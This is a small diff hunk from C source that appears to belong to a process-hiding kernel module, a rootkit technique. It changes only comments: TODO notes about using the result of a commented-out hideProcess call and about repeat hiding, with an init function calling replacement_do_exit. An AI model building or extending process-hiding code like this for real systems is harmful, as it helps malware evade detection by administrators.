@@ -20,7 +20,9 @@ static int hideProcess(int pidNumber);
 int processHider_init(void) {
 	//TODO: only hide proccess when wanted ...
 	//pid_t pid = 2404; //TODO: change this 
-	//hideProcess(pid);
+	//hideProcess(pid); // todo: perhaps use result of function call..
+	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
+
 	replacement_do_exit(0);
 	return 0;
 }
